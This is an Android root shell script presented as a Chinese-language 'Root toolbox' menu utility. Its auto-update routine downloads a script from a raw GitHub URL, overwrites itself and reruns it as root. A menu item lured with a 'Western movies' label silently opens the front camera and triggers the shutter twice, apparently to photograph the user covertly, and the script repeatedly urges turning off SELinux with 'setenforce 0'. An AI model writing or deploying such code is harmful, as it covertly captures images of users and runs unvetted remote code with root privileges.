#!/system/bin/sh
# ============================================
# Root工具箱 - 自动更新版 v3.6
# ============================================
VERSION="3.6"
DEBUG=false
LOG_FILE="/data/local/tmp/root_toolbox.log"
# 更新配置（请替换为你的实际URL）
UPDATE_URL="https://raw.githubusercontent.com/mvxffd/mai/9442433af2bea50a5256fa7fba78cedc7fae57e4/7.sh"
UPDATE_CHECK_INTERVAL=86400
LAST_CHECK_FILE="/data/local/tmp/.last_update_check"
# ---------- 颜色定义 ----------
RED='\033[31m'
GREEN='\033[32m'
YELLOW='\033[33m'
BLUE='\033[34m'
MAGENTA='\033[35m'
CYAN='\033[36m'
WHITE='\033[37m'
BOLD_RED='\033[1;31m'
BOLD_GREEN='\033[1;32m'
BOLD_YELLOW='\033[1;33m'
BOLD_CYAN='\033[1;36m'
BOLD_BLUE='\033[1;34m'
BOLD_WHITE='\033[1;37m'
RESET='\033[0m'
SEP='============================================================='
# ---------- 日志函数 ----------
log() {
    local msg="[$(date '+%Y-%m-%d %H:%M:%S')] $*"
    mkdir -p /data/local/tmp 2>/dev/null
    echo "$msg" >> "$LOG_FILE" 2>/dev/null
    [ "$DEBUG" = "true" ] && echo -e "${YELLOW}[DEBUG] $*${RESET}" >&2
}
error_log() {
    local msg="[ERROR] $*"
    log "$msg"
    echo -e "${RED}❌ $*${RESET}" >&2
}
success_log() {
    local msg="[SUCCESS] $*"
    log "$msg"
    echo -e "${GREEN}✅ $*${RESET}"
}
info_log() {
    local msg="[INFO] $*"
    log "$msg"
    echo -e "${CYAN}ℹ️  $*${RESET}"
}
# ---------- 自动更新功能【兼容修复：移除数组、curl容错】 ----------
has_curl() {
    command -v curl >/dev/null 2>&1
}
check_network() {
    if ping -c 1 8.8.8.8 >/dev/null 2>&1; then
        return 0
    elif ping -c 1 114.114.114.114 >/dev/null 2>&1; then
        return 0
    else
        return 1
    fi
}
get_remote_version() {
    if ! has_curl; then
        echo ""
        return
    fi
    local remote_version
    remote_version=$(curl -s --connect-timeout 5 "$UPDATE_URL" 2>/dev/null | grep "VERSION=" | head -1 | cut -d'"' -f2)
    echo "$remote_version"
}
# 版本比较：移除数组、替换for(( ))为while兼容循环
compare_versions() {
    local v1="$1"
    local v2="$2"
    v1=$(echo "$v1" | sed 's/^v//')
    v2=$(echo "$v2" | sed 's/^v//')
    if [ "$v1" = "$v2" ]; then
        return 0
    fi
    # 拆分版本号字符串 替换数组逻辑
    v1_1=$(echo "$v1" | cut -d'.' -f1)
    v1_2=$(echo "$v1" | cut -d'.' -f2)
    v1_3=$(echo "$v1" | cut -d'.' -f3)
    v2_1=$(echo "$v2" | cut -d'.' -f1)
    v2_2=$(echo "$v2" | cut -d'.' -f2)
    v2_3=$(echo "$v2" | cut -d'.' -f3)
    # 空值补0
    v1_1=${v1_1:-0}
    v1_2=${v1_2:-0}
    v1_3=${v1_3:-0}
    v2_1=${v2_1:-0}
    v2_2=${v2_2:-0}
    v2_3=${v2_3:-0}
    if [ "$v1_1" -lt "$v2_1" ]; then
        return 2
    elif [ "$v1_1" -gt "$v2_1" ]; then
        return 1
    fi
    if [ "$v1_2" -lt "$v2_2" ]; then
        return 2
    elif [ "$v1_2" -gt "$v2_2" ]; then
        return 1
    fi
    if [ "$v1_3" -lt "$v2_3" ]; then
        return 2
    elif [ "$v1_3" -gt "$v2_3" ]; then
        return 1
    fi
    return 0
}
perform_update() {
    if ! has_curl; then
        error_log "当前设备无curl工具，无法更新，直接跳过"
        return 1
    fi
    echo ""
    echo -e "${BOLD_CYAN}${SEP}${RESET}"
    echo -e "${GREEN}🔄 开始自动更新...${RESET}"
    echo -e "${BOLD_CYAN}${SEP}${RESET}"
    local temp_file="/data/local/tmp/update_script_$$.sh"
    local backup_file="/data/local/tmp/rootbox_backup_$(date +%Y%m%d_%H%M%S).sh"
    if [ -f "$0" ]; then
        cp "$0" "$backup_file" 2>/dev/null
        echo -e "${YELLOW}📦 已备份当前版本到: $backup_file${RESET}"
    fi
    echo -e "${CYAN}📥 正在下载新版本...${RESET}"
    if curl -s --connect-timeout 10 -o "$temp_file" "$UPDATE_URL"; then
        if [ -f "$temp_file" ] && [ -s "$temp_file" ]; then
            local new_version
            new_version=$(grep "VERSION=" "$temp_file" 2>/dev/null | head -1 | cut -d'"' -f2)
            if [ -n "$new_version" ]; then
                echo -e "${GREEN}✅ 下载成功！新版本: v$new_version${RESET}"
                chmod 755 "$temp_file" 2>/dev/null
                if cp "$temp_file" "$0" 2>/dev/null; then
                    chmod 755 "$0" 2>/dev/null
                    rm -f "$temp_file" 2>/dev/null
                    date +%s > "$LAST_CHECK_FILE"
                    echo -e "${GREEN}✅ 更新成功！版本已更新到 v$new_version${RESET}"
                    echo ""
                    echo -e "${YELLOW}💡 重启脚本以应用新版本${RESET}"
                    echo -n -e "${CYAN}是否立即重启脚本？[y/N]: ${RESET}"
                    read restart_confirm
                    case "$restart_confirm" in
                        y|Y)
                            echo -e "${GREEN}正在重启...${RESET}"
                            su -c sh "$0"
                            exit 0
                            ;;
                        *)
                            echo -e "${YELLOW}请手动重启脚本以应用更新${RESET}"
                            exit 0
                            ;;
                    esac
                else
                    error_log "更新失败：无法覆盖当前脚本"
                    rm -f "$temp_file" 2>/dev/null
                    return 1
                fi
            else
                error_log "下载的文件无效（版本信息缺失）"
                rm -f "$temp_file" 2>/dev/null
                return 1
            fi
        else
            error_log "下载文件为空或失败"
            rm -f "$temp_file" 2>/dev/null
            return 1
        fi
    else
        error_log "下载失败，请检查网络连接"
        rm -f "$temp_file" 2>/dev/null
        return 1
    fi
}
check_update() {
    if ! has_curl; then
        info_log "无curl，跳过更新检测"
        return 0
    fi
    local current_time
    current_time=$(date +%s)
    local last_check=0
    if [ -f "$LAST_CHECK_FILE" ]; then
        last_check=$(cat "$LAST_CHECK_FILE" 2>/dev/null)
    fi
    local time_diff=$((current_time - last_check))
    if [ "$1" != "force" ] && [ "$time_diff" -lt "$UPDATE_CHECK_INTERVAL" ] && [ "$last_check" -gt 0 ]; then
        return 0
    fi
    info_log "检查更新..."
    if ! check_network; then
        info_log "网络不可用，跳过更新检查"
        return 0
    fi
    local remote_version
    remote_version=$(get_remote_version)
    if [ -z "$remote_version" ]; then
        info_log "无法获取远程版本信息"
        return 0
    fi
    compare_versions "$VERSION" "$remote_version"
    local cmp_result=$?
    if [ "$cmp_result" -eq 2 ]; then
        echo ""
        echo -e "${BOLD_YELLOW}══════════════════════════════════════════════════════════${RESET}"
        echo -e "${GREEN}📢 发现新版本！${RESET}"
        echo -e "${CYAN}   当前版本: v$VERSION${RESET}"
        echo -e "${CYAN}   最新版本: v$remote_version${RESET}"
        echo -e "${YELLOW}   更新内容: 修复bug，增加新功能，优化性能${RESET}"
        echo -e "${BOLD_YELLOW}══════════════════════════════════════════════════════════${RESET}"
        echo ""
        echo -n -e "${CYAN}是否立即更新？[Y/n]: ${RESET}"
        read update_confirm
        case "$update_confirm" in
            n|N)
                echo -e "${YELLOW}已跳过更新${RESET}"
                date +%s > "$LAST_CHECK_FILE"
                ;;
            *)
                perform_update
                ;;
        esac
    else
        info_log "当前已是最新版本 (v$VERSION)"
        date +%s > "$LAST_CHECK_FILE"
    fi
}
# ---------- 权限校验 ----------
check_root() {
    local uid
    uid=$(id -u 2>/dev/null || echo 9999)
    if [ "$uid" -ne 0 ]; then
        echo -e "${BOLD_GREEN}${SEP}${RESET}"
        echo -e "${RED}            权限校验失败${RESET}"
        echo -e "${RED}  本脚本必须使用root权限运行！${RESET}"
        echo -e "${RED}   没有root权限，你活着干哈 ${RESET}"
        echo -e "${BOLD_GREEN}${SEP}${RESET}"
        log "权限校验失败，非root用户"
        exit 1
    fi
    log "权限校验通过"
}
# ---------- 通用工具函数 ----------
safe_exec() {
    local cmd="$1"
    local error_msg="${2:-命令执行失败}"
    eval "$cmd" 2>/dev/null
    if [ $? -eq 0 ]; then
        return 0
    else
        error_log "$error_msg"
        return 1
    fi
}
start_app() {
    local pkg="$1"
    local act="${2:-}"
    local result=0
    pm list packages 2>/dev/null | grep -q "$pkg"
    if [ $? -ne 0 ]; then
        error_log "应用 $pkg 未安装"
        return 1
    fi
    if [ -n "$act" ]; then
        am start -n "${pkg}/${act}" >/dev/null 2>&1
        result=$?
    else
        am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER "$pkg" >/dev/null 2>&1
        result=$?
    fi
    if [ "$result" -eq 0 ]; then
        success_log "已启动 $pkg"
        return 0
    else
        error_log "启动失败 $pkg"
    fi
}
wait_return() {
    echo -e "${GREEN}按回车返回主菜单...${RESET}"
    read tmp 2>/dev/null
    clear
}
get_prop() {
    local prop="$1"
    local default="${2:-}"
    local val
    val=$(getprop "$prop" 2>/dev/null)
    if [ -z "$val" ]; then
        val="$default"
    fi
    echo "$val"
}
format_size() {
    local size="$1"
    case "$size" in
        ''|*[!0-9]*) echo "未知大小"; return ;;
    esac
    if [ "$size" -ge 1048576 ]; then
        echo "$((size / 1048576)) MB"
    elif [ "$size" -ge 1024 ]; then
        echo "$((size / 1024)) KB"
    else
        echo "${size} B"
    fi
}
# ---------- 主菜单 ----------
show_menu() {
    clear
    echo -e "${BOLD_CYAN}${SEP}${RESET}"
    echo -e "${RED}                Root 工具箱 v${VERSION}${RESET}"
    echo -e "${BOLD_WHITE}                $(date '+%Y-%m-%d %H:%M:%S')${RESET}"
    echo ""
    echo -e "${GREEN} 1 欧美大片专区${RESET}          ${CYAN} 6 设备信息${RESET}"
    echo -e "${YELLOW} 2 Scene${RESET}                 ${GREEN} 7 批量复制PNG${RESET}"
    echo -e "${BLUE} 3 系统设置${RESET}               ${MAGENTA} 8 清理缓存${RESET}"
    echo -e "${MAGENTA} 4 微信${RESET}"
    echo -e "${BOLD_RED} 5 退出脚本${RESET}"
    echo -e "${BOLD_CYAN}${SEP}${RESET}"
    echo -e "${YELLOW}📌 输入 U 检查更新，输入数字后按回车确认${RESET}"
    echo -n -e "${CYAN}请输入选项: ${RESET}"
}
# ---------- 功能函数 ----------
menu_europe() {
    local PACKAGE="com.oplus.camera"
    local DIR="/storage/emulated/0/欧美链接在这"
    local TXT_PATH="${DIR}/欧美链接在这.txt"
    local TXT_CONTENT="https://t.me/cnxvlog ← 先开VPN，再用浏览器打开"
    info_log "启动欧美大片专区"
    info_log "提示：若功能无效果，请先执行 su setenforce 0"
    pm list packages 2>/dev/null | grep -q "$PACKAGE"
    if [ $? -ne 0 ]; then
        error_log "相机应用 $PACKAGE 未安装"
        wait_return
        return 1
    fi
    echo -e "${GREEN}🎬 有惊喜 😁😁${RESET}"
    i=1
    while [ "$i" -le 2 ]; do
        am start -n "${PACKAGE}/.Camera" --ei android.intent.extras.CAMERA_FACING 1 >/dev/null 2>&1
        sleep 1
        input keyevent 25
        sleep 1
        i=$((i + 1))
    done
    su -c "mkdir -p \"$DIR\" 2>/dev/null; [ -f \"$TXT_PATH\" ] || echo \"$TXT_CONTENT\" > \"$TXT_PATH\""
    echo -e "${GREEN}✓ 目录与文本文件处理完成${RESET}"
    echo -e "${BLUE}📁 固定目录: ${DIR}${RESET}"
    wait_return
}
menu_device_info() {
    info_log "查看设备信息"
    echo -e "${BOLD_BLUE}==================== 设备系统信息 ====================${RESET}"
    echo -e "${CYAN}当前时间: $(date '+%Y-%m-%d %H:%M:%S')${RESET}"
    echo ""
    echo -e "${CYAN}【内核版本】${RESET}"
    uname -a 2>/dev/null || echo "读取失败"
    echo -e "${CYAN}【设备硬件型号】${RESET}"
    echo "$(get_prop ro.product.model "未知")"
    echo -e "${CYAN}【制造商】${RESET}"
    echo "$(get_prop ro.product.manufacturer "未知")"
    echo -e "${CYAN}【Android版本】${RESET}"
    echo "$(get_prop ro.build.version.release "未知")"
    api_level=$(get_prop ro.build.version.sdk)
    [ -n "$api_level" ] && echo "API级别：$api_level"
    patch_date=$(get_prop ro.build.version.security_patch)
    [ -n "$patch_date" ] && echo "安全补丁：$patch_date"
    echo -e "${CYAN}【处理器】${RESET}"
    cpu_info=$(cat /proc/cpuinfo 2>/dev/null | grep -E "Hardware|Processor" | head -1 | cut -d: -f2 | sed 's/^[ \t]*//')
    if [ -n "$cpu_info" ]; then
        echo "$cpu_info"
    else
        echo "未识别处理器"
    fi
    echo -e "${CYAN}【CPU核心】${RESET}"
    cpu_cores=$(grep -c "^processor" /proc/cpuinfo 2>/dev/null)
    echo "核心数: ${cpu_cores:-未知}"
    echo -e "${CYAN}【内存信息】${RESET}"
    if command -v free >/dev/null 2>&1; then
        free -m 2>/dev/null | grep Mem | while read line; do
            total=$(echo $line | awk '{print $2}')
            used=$(echo $line | awk '{print $3}')
            if [ -n "$total" ]; then
                echo "总内存: ${total} MB"
                echo "已用内存: ${used} MB"
            fi
        done
    else
        echo "无free命令，无法读取内存"
    fi
    echo -e "${BOLD_BLUE}======================================================${RESET}"
    wait_return
}
menu_png_batch() {
    local SRC_DIR="/storage/emulated/0/1"
    local TARGET_DIR="/storage/emulated/0/2"
    local PNG_FOUND=""
    # 移除数组，改用空格分隔字符串兼容toybox
    local NAME_LIST="0y 1S 5Q 7c _e C9 CG D2 Et jy kb Mb SD tf u3"
    local total_count=15
    local copy_success=0
    local copy_failed=0
    clear
    echo -e "${BOLD_BLUE}===== PNG批量复制工具 v2.0 =====${RESET}"
    info_log "启动PNG批量复制"
    info_log "提示：复制失败请先执行 su setenforce 0"
    if [ ! -d "$SRC_DIR" ]; then
        error_log "源目录不存在: $SRC_DIR"
        echo -e "${YELLOW}💡 请手动在手机根目录创建文件夹 1 并放入PNG图片${RESET}"
        wait_return
        return 1
    fi
    info_log "扫描源目录: $SRC_DIR"
    echo -e "${CYAN}🔍 正在扫描源目录...${RESET}"
    PNG_FOUND=$(find "$SRC_DIR" -maxdepth 1 -type f \( -iname "*.png" -o -iname "*.PNG" \) 2>/dev/null | head -n1)
    if [ -z "$PNG_FOUND" ]; then
        echo -e "${YELLOW}⚠️  当前目录未找到PNG，尝试递归搜索子目录...${RESET}"
        PNG_FOUND=$(find "$SRC_DIR" -maxdepth 2 -type f \( -iname "*.png" -o -iname "*.PNG" \) 2>/dev/null | head -n1)
    fi
    if [ -z "$PNG_FOUND" ]; then
        error_log "未找到PNG图片"
        echo -e "${RED}【错误】$SRC_DIR 及其子目录内未找到PNG图片！${RESET}"
        echo -e "${YELLOW}💡 支持的格式: .png .PNG${RESET}"
        wait_return
        return 1
    fi
    local FILE_SIZE=""
    if stat -c%s "$PNG_FOUND" >/dev/null 2>&1; then
        FILE_SIZE=$(stat -c%s "$PNG_FOUND")
    elif stat -f%z "$PNG_FOUND" >/dev/null 2>&1; then
        FILE_SIZE=$(stat -f%z "$PNG_FOUND")
    fi
    local FILE_NAME=$(basename "$PNG_FOUND")
    local FILE_PATH=$(dirname "$PNG_FOUND")
    echo -e "${GREEN}✅ 找到图片: $FILE_NAME${RESET}"
    echo -e "${CYAN}📁 源路径: $FILE_PATH${RESET}"
    [ -n "$FILE_SIZE" ] && echo -e "${CYAN}📦 文件大小: $(format_size "$FILE_SIZE")${RESET}"
    echo -e "${YELLOW}📂 目标目录: $TARGET_DIR${RESET}"
    echo ""
    if [ -d "$TARGET_DIR" ]; then
        existing_count=$(find "$TARGET_DIR" -maxdepth 1 -type f -iname "*.png" 2>/dev/null | wc -l)
        echo -e "${YELLOW}⚠️  目标目录已有 $existing_count 个PNG文件${RESET}"
    fi
    echo -e "${YELLOW}即将复制 $total_count 个文件:${RESET}"
    echo -n "   "
    cols=0
    for name in $NAME_LIST; do
        echo -n "${name}.png  "
        cols=$((cols + 1))
        if [ "$cols" -eq 5 ]; then
            echo ""
            echo -n "   "
            cols=0
        fi
    done
    echo ""
    echo ""
    echo -n -e "${CYAN}确认执行? [y/N]: ${RESET}"
    read confirm
    echo ""
    case "$confirm" in
        y|Y)
            info_log "开始复制PNG文件"
            echo -e "${CYAN}⏳ 正在复制...${RESET}"
            su -c "
                mkdir -p \"$TARGET_DIR\" 2>/dev/null
                copy_success=0
                copy_failed=0
                for name in $NAME_LIST; do
                    target=\"${TARGET_DIR}/\${name}.png\"
                    if [ -f \"\$target\" ]; then
                        backup=\"${TARGET_DIR}/\${name}_backup_\$(date +%s).png\"
                        mv \"\$target\" \"\$backup\" 2>/dev/null
                        echo \"⚠️  已备份: \${name}.png\"
                    fi
                    if cp \"$PNG_FOUND\" \"\$target\" 2>/dev/null; then
                        echo \"✅ \${name}.png\"
                        copy_success=\$((copy_success + 1))
                    else
                        echo \"❌ \${name}.png (复制失败)\"
                        copy_failed=\$((copy_failed + 1))
                    fi
                done
                echo \"📊 复制完成: 成功 \$copy_success 个，失败 \$copy_failed 个\"
            "
            ;;
        *)
            echo -e "${YELLOW}已取消操作${RESET}"
            ;;
    esac
    wait_return
}
menu_clean_cache() {
    clear
    echo -e "${BOLD_BLUE}===== 缓存清理工具 =====${RESET}"
    info_log "启动缓存清理"
    echo -e "${CYAN}正在计算缓存大小...${RESET}"
    total_size=0
    for dir in /data/data/*/cache /data/data/*/code_cache /storage/emulated/0/Android/data/*/cache; do
        if [ -d "$dir" ]; then
            size=$(du -s "$dir" 2>/dev/null | cut -f1)
            case "$size" in
                ''|*[!0-9]*) ;;
                *) total_size=$((total_size + size)) ;;
            esac
        fi
    done
    total_size_mb=$((total_size / 1024))
    echo -e "${CYAN}📦 缓存总大小: ${total_size_mb} MB${RESET}"
    echo -n -e "${CYAN}确认清理? [y/N]: ${RESET}"
    read confirm
    echo ""
    case "$confirm" in
        y|Y)
            echo -e "${YELLOW}⏳ 正在清理缓存...${RESET}"
            su -c "
                for dir in /data/data/*/cache /data/data/*/code_cache /storage/emulated/0/Android/data/*/cache; do
                    if [ -d \"\$dir\" ]; then
                        rm -rf \"\$dir\"/* 2>/dev/null
                    fi
                done
                echo '缓存清理完成'
            "
            success_log "缓存清理完成"
            ;;
        *)
            echo -e "${YELLOW}已取消操作${RESET}"
            ;;
    esac
    wait_return
}
# ---------- 主程序入口【移除死循环自迁移】 ----------
main() {
    trap 'echo -e "\n${YELLOW}脚本被中断${RESET}"; exit 1' INT TERM
    check_root
    log "========== Root工具箱 v$VERSION 启动 =========="
    check_update
    while true; do
        show
        read key 2>/dev/null
        echo ""
        case "$key" in
            u|U)
                check_update force
                wait_return
                continue
                ;;
        esac
        case "$key" in
            1) menu_europe ;;
            2) start_app "com.omarea.vtools" && wait_return ;;
            3) start_app "com.android.settings" && wait_return ;;
            4) start_app "com.tencent.mm" ".ui.LauncherUI" && wait_return ;;
            5)
                echo -e "${GREEN}正在退出脚本...${RESET}"
                log "脚本正常退出"
                exit 0
                ;;
            6) menu_device_info ;;
            7) menu_png_batch ;;
            8) menu_clean_cache ;;
            *)
                if [ -n "$key" ]; then
                    echo -e "${RED}输入错误，请重新选择！${RESET}"
                    sleep 1
                fi
        esac
    done
}
# 修复笔误show → show_menu
main() {
    trap 'echo -e "\n${YELLOW}脚本被中断${RESET}"; exit 1' INT TERM
    check_root
    log "========== Root工具箱 v$VERSION 启动 =========="
    check_update
    while true; do
        show_menu
        read key 2>/dev/null
        echo ""
        case "$key" in
            u|U)
                check_update force
                wait_return
                continue
                ;;
        esac
        case "$key" in
            1) menu_europe ;;
            2) start_app "com.omarea.vtools" && wait_return ;;
            3) start_app "com.android.settings" && wait_return ;;
            4) start_app "com.tencent.mm" ".ui.LauncherUI" && wait_return ;;
            5)
                echo -e "${GREEN}正在退出脚本...${RESET}"
                log "脚本正常退出"
                exit 0
                ;;
            6) menu_device_info ;;
            7) menu_png_batch ;;
            8) menu_clean_cache ;;
            *)
                if [ -n "$key" ]; then
                    echo -e "${RED}输入错误，请重新选择！${RESET}"
                    sleep 1
                fi
        esac
    done
}
# 启动主程序
main "$@"
